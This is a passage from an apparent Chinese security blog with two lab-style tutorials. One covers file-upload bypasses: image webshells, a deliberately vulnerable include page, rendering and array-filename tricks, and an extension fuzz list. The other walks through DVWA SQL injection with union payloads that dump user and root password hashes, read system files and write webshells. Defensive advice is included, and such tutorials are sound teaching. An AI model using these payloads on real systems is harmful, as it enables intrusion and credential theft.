&quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个是存在文件头检测的上传，getReailFileType 是检测 jpg、png、gif 的文件。如果上传的文件符合数字即可通过检测。</p>
<h4 id="7-3-2-文件头检测绕过传攻击方法"><a href="#7-3-2-文件头检测绕过传攻击方法" class="headerlink" title="7.3.2 文件头检测绕过传攻击方法"></a>7.3.2 文件头检测绕过传攻击方法</h4><ol>
<li>作图片一句话，使用 copy 1.gif/b+moon.php shell.php 将 php 文件附加再 jpg 图片上，直接上传即可。</li>
</ol>
<p><img src="/image/cmd叠加文件.png" alt="cmd叠加文件"></p>
<p>然后打开文件包含漏洞界面进行getshell<br><img src="/image/include.png" alt="文件包含"><br>代码如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">/*</span><br><span class="line">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span><br><span class="line">*/</span><br><span class="line">header(&quot;Content-Type:text/html;charset=utf-8&quot;);</span><br><span class="line">$file = $_GET[&#x27;file&#x27;];</span><br><span class="line">if(isset($file))&#123;</span><br><span class="line">    include $file;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    show_source(__file__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure></p>
<ol>
<li>使用 burpsuite 上传数据包 修改头文件添加文件头<br><img src="/image/brup修改.png" alt="brup修改"></li>
</ol>
<h4 id="7-3-3-图片检测函数绕过上传"><a href="#7-3-3-图片检测函数绕过上传" class="headerlink" title="7.3.3 图片检测函数绕过上传"></a>7.3.3 图片检测函数绕过上传</h4><p><code>getimagesize()</code>获取图片大小<br>上传图片马即可绕过</p>
<h3 id="7-4-绕过图片二次渲染上传"><a href="#7-4-绕过图片二次渲染上传" class="headerlink" title="7.4 绕过图片二次渲染上传"></a>7.4 绕过图片二次渲染上传</h3><p>有些图片上传，会对上传的图片进行二次渲染后在保存，体积可能会更小，图片会模糊一些，但是符合网站的需求。例如新闻图片封面等可能需要二次渲染，因为原图片占用的体积更大。访问的人数太多时候会占用，很大带宽。二次渲染后的图片内容会减少，如果里面包含后门代码，可能会被省略。导致上传的图片马，恶意代码被清除。</p>
<h4 id="7-4-1-图片二次渲染分析代码"><a href="#7-4-1-图片二次渲染分析代码" class="headerlink" title="7.4.1 图片二次渲染分析代码"></a>7.4.1 图片二次渲染分析代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span><br><span class="line">    $filename = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class="line">    $filetype = $_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;];</span><br><span class="line">    $tmpname = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.&#x27;/&#x27;.basename($filename);   //获取文件名以及后缀名</span><br><span class="line"></span><br><span class="line">    // 获得上传文件的扩展名</span><br><span class="line">    $fileext= substr(strrchr($filename,&quot;.&quot;),1);</span><br><span class="line"></span><br><span class="line">    //判断文件后缀与类型，合法才进行上传操作</span><br><span class="line">    if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;该文件不是jpg格式的图片！&quot;;</span><br><span class="line">                @unlink($target_path);          //删除源文件</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.jpg&quot;;</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename;</span><br><span class="line">                imagejpeg($im,$img_path);</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;该文件不是png格式的图片！&quot;;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                 //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.png&quot;;</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename;</span><br><span class="line">                imagepng($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = true;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123;</span><br><span class="line">        if(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            //使用上传的图片生成新的图片</span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            if($im == false)&#123;</span><br><span class="line">                $msg = &quot;该文件不是gif格式的图片！&quot;;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                //给新图片指定文件名</span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).&quot;.gif&quot;;</span><br><span class="line">                //显示二次渲染后的图片（使用用户上传图片生成的新图片）</span><br><span class="line">                $img_path = UPLOAD_PATH.&#x27;/&#x27;.$newfilename;</span><br><span class="line">                imagegif($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &quot;上传出错！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>只允许上传 <strong>JPG</strong> <strong>PNG</strong> <strong>gif</strong> 在源码中使用 <code>imagecreatefromgif()</code> 函数对图片进行二次生成。生成的图片保存在，upload 目录下。</p>
<h4 id="7-4-2-绕过图片二次渲染攻击。"><a href="#7-4-2-绕过图片二次渲染攻击。" class="headerlink" title="7.4.2 绕过图片二次渲染攻击。"></a>7.4.2 绕过图片二次渲染攻击。</h4><p>首先判断图片是否允许上传 gif，gif 图片在二次渲染后，与原图片差别不会太大。所以二次渲染攻击最好用 git 图片马。</p>
<p><strong><em>制作图片马</em></strong><br>先将原图片上传，再下载渲染后的图片进行对比，找相同处，覆盖字符串，填写一句话后门，或者恶意指令。<br><img src="/image/对比截取内容.png" alt="对比截取内容"><br>原图片与渲染后的图片这个位置的字符串没有改变所在原图片这里替换成 <code>&lt;?php phpinfo();?&gt;</code> 直接上传即可。<br><img src="/image/制作图片马.png" alt="制作图片马"><br><img src="/image/截取图片绕过.png" alt="截取图片绕过"></p>
<h3 id="7-5-数组绕过上传"><a href="#7-5-数组绕过上传" class="headerlink" title="7.5 数组绕过上传"></a>7.5 数组绕过上传</h3><p>有的文件上传，如果支持数组上传或者数组命名。如果逻辑写的有问题会造成安全隐患，导致不可预期的上传。这种上传攻击，它是属于攻击者白盒审计后发现的漏洞居多。</p>
<h4 id="7-5-1-数组绕过代码分析"><a href="#7-5-1-数组绕过代码分析" class="headerlink" title="7.5.1 数组绕过代码分析"></a>7.5.1 数组绕过代码分析</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(!empty($_FILES[&#x27;upload_file&#x27;]))&#123;</span><br><span class="line">    //检查MIME</span><br><span class="line">    $allow_type = array(&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;);      //允许上传类型</span><br><span class="line">    if(!in_array($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;],$allow_type))&#123;      </span><br><span class="line">        $msg = &quot;禁止上传该类型文件!&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        //检查文件名</span><br><span class="line">        $file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;];     //检查是否为空,储存文件名用于匹配白名单</span><br><span class="line">        if (!is_array($file)) &#123;</span><br><span class="line">            $file = explode(&#x27;.&#x27;, strtolower($file));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ext = end($file);      //获取数组中的文件名</span><br><span class="line">        $allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br><span class="line">        if (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">            $msg = &quot;禁止上传该后缀文件!&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1];      //将数组中的文件名名以 . 隔开再进行重组。因最后提取数组末尾代码有逻辑错误可绕过</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name;</span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $msg = &quot;文件上传成功！&quot;;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &quot;文件上传失败！&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $msg = &quot;请选择要上传的文件！&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先检测文件类型，看到可控参数 save_name 如果不是数组，后缀名不是图片禁止上传。<br>如果是数组绕过图片类型检测 接着处理数组。<br>首先 一个例子的处理。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file= $_GET[&#x27;save_name&#x27;];</span><br><span class="line">echo $file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>如果是两个参数 拼接字符串是 <code>aaaaaaa.php/.png</code><br><img src="/image/test1.png" alt="test1"><br>如果下表是 1 为正常图片上传，如果下表大于 1 因为<code>count()-1</code>，则png就不显示。拼接字符串 <code>aaaaaaa.php/.</code> 在<code>move_uploaded_file()</code>函数中 /.在window会自动忽略 所以可以移动到指定目录。<br><img src="/image/test1.png" alt="test2"></p>
<h4 id="7-5-2-数组绕过攻击方法"><a href="#7-5-2-数组绕过攻击方法" class="headerlink" title="7.5.2 数组绕过攻击方法"></a>7.5.2 数组绕过攻击方法</h4><p>构造上传表单，设置数组上传。从代码中，可以知道第二个数组必须大于 1 即可第二个数组的值就获取不了，字符串拼接起来就是 1.php/. 就能上传1.php。要把<code>Content-Type:</code>换成<code>imag
![设置参数1](/image/设置参数1.png)
![设置参数2](/image/设置参数2.png)
也可用</code>`绕过<br><img src="/image/绕过.png" alt="\绕过"></p>
<h3 id="7-6-文件上传其他漏洞"><a href="#7-6-文件上传其他漏洞" class="headerlink" title="7.6 文件上传其他漏洞"></a>7.6 文件上传其他漏洞</h3><p>nginx 0.83 /1.jpg%00php<br>apahce 1x 或者 2x<br>当 apache 遇见不认识的后缀名，会从后向前解析例如 1.php.rar 不认识 rar 就向前解析，直到知道它认识的后缀名<br>phpcgi 漏洞(nginx iis7 或者以上) 上传图片后 1.jpg。访问 1.jpg/1.php 也会解析成php。<br>Apache HTTPD 换行解析漏洞（CVE-2017-15715）<br>apache 通过 mod_php 来运行脚本，其 2.4.0-2.4.29 中存在 apache 换行解析漏洞，在解析 php 时 xxx.php\x0A 将被按照 PHP 后缀进行解析，导致绕过一些服务器的安全策略。</p>
<h4 id="7-6-1-文件上传漏洞懒人检测方法"><a href="#7-6-1-文件上传漏洞懒人检测方法" class="headerlink" title="7.6.1 文件上传漏洞懒人检测方法"></a>7.6.1 文件上传漏洞懒人检测方法</h4><p>判断是否为黑白名单，如果是白名单 寻找可控参数。如果是黑名单禁止上传，可以用有危害的后缀名批量提交测试，寻找遗留的执行脚本。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">.php</span><br><span class="line">.php5</span><br><span class="line">.php4</span><br><span class="line">.php3</span><br><span class="line">.php2</span><br><span class="line">.html</span><br><span class="line">.htm</span><br><span class="line">.phtml</span><br><span class="line">.pht</span><br><span class="line">.pHp</span><br><span class="line">.phP</span><br><span class="line">.pHp5</span><br><span class="line">.pHp4</span><br><span class="line">.pHp3</span><br><span class="line">.pHp2</span><br><span class="line">.Html</span><br><span class="line">.Htm</span><br><span class="line">.pHtml</span><br><span class="line">.jsp</span><br><span class="line">.jspa</span><br><span class="line">.jspx</span><br><span class="line">.jsw</span><br><span class="line">.jsv</span><br><span class="line">.jspf</span><br><span class="line">.jtml</span><br><span class="line">.jSp</span><br><span class="line">.jSpx</span><br><span class="line">.jSpa</span><br><span class="line">.jSw</span><br><span class="line">.jSv</span><br><span class="line">.jSpf</span><br><span class="line">.jHtml</span><br><span class="line">.asp</span><br><span class="line">.aspx</span><br><span class="line">.asa</span><br><span class="line">.asax</span><br><span class="line">.ascx</span><br><span class="line">.ashx</span><br><span class="line">.asmx</span><br><span class="line">.cer</span><br><span class="line">.aSp</span><br><span class="line">.aSpx</span><br><span class="line">.aSa</span><br><span class="line">.aSax</span><br><span class="line">.aScx</span><br><span class="line">.aShx</span><br><span class="line">.aSmx</span><br><span class="line">.cEr</span><br><span class="line">.sWf</span><br><span class="line">.swf</span><br><span class="line">.htaccess</span><br></pre></td></tr></table></figure><br>使用 burpsuite 抓包上传将后缀名设置成变量，把这些文件设置成一个字典批量提交。</p>
<p>查看数据包大小 查看确定时候可上传即可。</p>
<h2 id="8-文件上传的防御方法简述"><a href="#8-文件上传的防御方法简述" class="headerlink" title="8. 文件上传的防御方法简述"></a>8. 文件上传的防御方法简述</h2><p>服务器端使用白名单防御，修复 web 中间件的漏洞，禁止客户端存在可控参数，存放文件目录禁止脚本执行，限制后缀名 一定要设置图片格式 jpg、gif 、png 文件名随机的，不可预测。</p>
<h2 id="9-文件上传的攻击方法"><a href="#9-文件上传的攻击方法" class="headerlink" title="9. 文件上传的攻击方法"></a>9. 文件上传的攻击方法</h2><p><img src="/image/文件上传漏洞.png" alt="文件上传漏洞"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://allofmortal.github.io/2021/12/09/sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Mortal">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/12/09/sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">sql 注入漏洞</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">نُشر في</span>

              <time title="أُنشأ: 2021-12-09 16:42:29" itemprop="dateCreated datePublished" datetime="2021-12-09T16:42:29+08:00">2021-12-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">عُدل في</span>
                <time title="عُدل: 2022-01-28 23:12:46" itemprop="dateModified" datetime="2022-01-28T23:12:46+08:00">2022-01-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">في</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
                </span>
                  ، 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%B8%97%E9%80%8F/web%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">web漏洞</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="sql-漏洞注入"><a href="#sql-漏洞注入" class="headerlink" title="sql 漏洞注入"></a>sql 漏洞注入</h1><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>  Web 程序代码中对于用户提交的参数未做过滤就直接放到 SQL 语句中执行，导致参数中的特殊字符打破了 SQL 语句原有逻辑，黑客可以利用该漏洞执行任意 SQL 语句，如查询数据、下载数据、写入webshell 、执行系统命令以及绕过登录限制等。</p>
<h4 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h4><p>  在发现有可控参数的地方使用 sqlmap 进行 SQL 注入的检查或者利用，也可以使用其他的 SQL 注入工具，简单点的可以手工测试，利用单引号、and 1=1 和 and 1=2 以及字符型注入进行判断！推荐使用 burpsuite 的 sqlmap 插件，这样可以很方便，鼠标右键就可以将数据包直接发送到 sqlmap 里面进行检测了！</p>
<p>  代码层最佳防御 sql 漏洞方案：采用 sql 语句预编译和绑定变量，是防御 sql 注入的最佳方法。</p>
<ol>
<li>所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中。当前几乎所有的数据库系统都提供了参数化 SQL 语句执行接口，使用此接口可以非常有效的防止 SQL 注入攻击。</li>
<li>对进入数据库的特殊字符（ ‘ &lt;&gt;&amp;*; 等）进行转义处理，或编码转换。</li>
<li>确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为 int 型。</li>
<li>数据长度应该严格规定，能在一定程度上防止比较长的 SQL 注入语句无法正确执行。</li>
<li>网站每个数据层的编码统一，建议全部使用 UTF-8 编码，上下层编码不一致有可能导致一些过滤模型被绕过。</li>
<li>严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。</li>
<li>避免网站显示 SQL 错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。</li>
</ol>
<h2 id="1-1-判断是否存在注入"><a href="#1-1-判断是否存在注入" class="headerlink" title="1.1 判断是否存在注入"></a>1.1 判断是否存在注入</h2><p>回显是指页面有数据信息返回</p>
<p>id =1 and 1=1<br>id = 1 and 1=2<br>id = 1 or 1=1<br>id = ‘1’ or ‘1’=’1’<br>id=” 1 “or “1”=”1”</p>
<p>无回显是指根据输入的语句页面没有任何变化,或者没有数据库中的内容显示到网页中.</p>
<h2 id="1-2-三种-sql-注释符"><a href="#1-2-三种-sql-注释符" class="headerlink" title="1.2 三种 sql 注释符"></a>1.2 三种 sql 注释符</h2><p><code>#</code> 单行注释 注意与 url 中的#区分，常编码为%23<br><code>--空格</code> 单行注释 注意为短线短线空格<br>/<em>（） 多行注释 至少存在俩处的注入 /*</em>/常用来作为空格</p>
<h2 id="1-3-注入流程"><a href="#1-3-注入流程" class="headerlink" title="1.3 注入流程"></a>1.3 注入流程</h2><p>是否存在注入并且判断注入类型</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">判断字段数         order by </span><br><span class="line">确定回显点         union select 1,2 </span><br><span class="line">查询数据库信息     @@version        @@datadir </span><br><span class="line">查询用户名，数据库名      user()     database()</span><br><span class="line">文件读取           union select 1,load_file       (&#x27;C:\\wondows\\win.ini&#x27;)# </span><br><span class="line">写入    webshell    select..into    outfile...</span><br></pre></td></tr></table></figure>
<p>补充一点，使用 sql 注入遇到转义字符串的单引号或者双引号，可使用 HEX 编码绕过</p>
<h2 id="1-4-SQL-注入分类"><a href="#1-4-SQL-注入分类" class="headerlink" title="1.4 SQL 注入分类"></a>1.4 SQL 注入分类</h2><p>SQL 注入分类,按 SQLMap 中的分类来看，SQL 注入类型有以下 5 种:<br>UNION query SQL injection （可联合查询注入）<br>Stacked queries SQL injection （可多语句查询注入）堆叠查询<br>Boolean-based blind SQL injection （布尔型注入）<br>Error-based SQL injection （报错型注入）<br>Time-based blind SQL injection （基于时间延迟注入）</p>
<h2 id="1-5-接受请求类型区分"><a href="#1-5-接受请求类型区分" class="headerlink" title="1.5 接受请求类型区分"></a>1.5 接受请求类型区分</h2><p><strong>GET注入</strong><br>GET 请求的参数是放在 URL 里的，GET 请求的 URL 传参有长度限制中文需要 URL 编码<br><strong>POST注入</strong><br>POST 请求参数是放在请求 body 里的，长度没有限制<br><strong>COOKIE注入</strong><br>cookie 参数放在请求头信息，提交的时候服务器会从请求头获取</p>
<h2 id="1-6-注入数据类型的区分"><a href="#1-6-注入数据类型的区分" class="headerlink" title="1.6 注入数据类型的区分"></a>1.6 注入数据类型的区分</h2><p><strong>int 整形</strong><br>select <em> from users where id=1<br><strong>sting 字符型</strong><br>select </em> from users where username=’admin’<br><strong>like 搜索型</strong><br>select * from news where title like ‘%标题%’</p>
<h2 id="1-7-SQL-注入常规利用思路"><a href="#1-7-SQL-注入常规利用思路" class="headerlink" title="1.7 SQL 注入常规利用思路"></a>1.7 SQL 注入常规利用思路</h2><ol>
<li>寻找注入点，可以通过 web 扫描工具实现</li>
<li>通过注入点，尝试获得关于连接数据库用户名、数据库名称、连接数据库用户权限、操作系统信息、数据库版本等相关信息。</li>
<li>猜解关键数据库表及其重要字段与内容（常见如存放管理员账户的表名、字段名等信息）</li>
<li>还可以获取数据库的 root 账号 密码—思路</li>
<li>可以通过获得的用户信息，寻找后台登录。</li>
<li>利用后台或了解的进一步信息。</li>
</ol>
<h2 id="1-8-手工注入常规思路"><a href="#1-8-手工注入常规思路" class="headerlink" title="1.8 手工注入常规思路"></a>1.8 手工注入常规思路</h2><ol>
<li>判断是否存在注入，注入是字符型还是数字型</li>
<li>猜解 SQL 查询语句中的字段数 order by N</li>
<li>确定显示的字段顺序</li>
<li>获取当前数据库</li>
<li>获取数据库中的表</li>
<li>获取表中的字段名</li>
<li>查询到账户的数据</li>
</ol>
<h2 id="1-9-SQL-详细注入过程"><a href="#1-9-SQL-详细注入过程" class="headerlink" title="1.9  SQL 详细注入过程"></a>1.9  SQL 详细注入过程</h2><p>猜数据库：<br><code>1&#39; union select 1,database()</code><br>payload 利用另一种方式：<br><code>1&#39; union select user(),database() version()</code><br>得到数据库名：<strong>dvwa</strong><br>PS：union 查询结合了两个 select 查询结果，根据上面的 order by 语句我们知道查询包含两列，为了能够现实两列查询结果，我们需要用 union 查询结合我们构造的另外一个 select.注意在使用 union 查询的时候需要和主查询的列数相同。<br>猜表名：<br><code>1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema =database()</code><br>得到表名：<strong>guestbook,users</strong><br>group_concat 分组<br>猜列名：<br><code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name =0x7573657273#</code><br><code>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name =&#39;users&#39;#</code><br>(用编码就不用单引号，用单引号就不用编码) 得到列：<br>user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,usernam e,password<br>猜用户数据：列举出几种 payload:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1=1 union select</span><br><span class="line">group_concat(user_id,first_name,last_name),group_concat(password) from users # 1&#x27; union select null,concat_ws(char(32,58,32),user,password) from users # 1&#x27; union select null,group_concat(concat_ws(char(32,58,32),user,password)) from </span><br><span class="line">users #</span><br></pre></td></tr></table></figure><br>得到用户数据：<br>admin   5f4dcc3b5aa765d61d8327deb882cf99<br>猜 root 用户：#<br><code>1&#39; union select 1,group_concat(user,password) from mysql.user#</code><br>得到 root 用户信息：<br>root*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</p>
